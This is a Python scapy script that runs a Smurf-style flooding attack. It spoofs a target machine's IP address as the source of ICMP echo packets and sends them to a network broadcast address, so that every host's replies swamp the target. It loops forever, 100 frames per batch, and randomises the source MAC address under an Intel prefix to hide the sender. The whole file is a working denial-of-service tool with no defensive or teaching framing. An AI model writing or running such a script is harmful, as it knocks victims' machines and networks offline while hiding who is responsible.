import argparse
from scapy.layers.inet import IP, ICMP
import sys
import random
from scapy.layers.l2 import Ether
from scapy.sendrecv import send, sendp, srp


def random_bytes(num=6):
    return [random.randrange(256) for _ in range(num)]


def generate_mac(oui=None, separator=':', byte_fmt='%02x'):
    if type(oui) == str:
        oui = [str(chunk) for chunk in oui.split(separator)]
    random_end = random_bytes(num=6 - len(oui))
    random_f = [byte_fmt % b for b in random_end]
    mac = oui + random_f
    return separator.join(x for x in mac)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument("target", action="store", help="ipv4 address of target machine")
    parser.add_argument("broadcast", action="store", help="broadcast address of target network")
    parser.add_argument("interface", action="store", help="Interface to send the packets from")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    while True:
        e = Ether(src=generate_mac(oui="80:19:34"), dst="ff:ff:ff:ff:ff:ff")
        # Generate MAC address with OUI of intel and set source MAC to random mac address

        i = IP()

        i.src = options.target
        i.dst = options.broadcast
        p = e / i / ICMP()
        r = sendp(p, iface=options.interface, count=100)
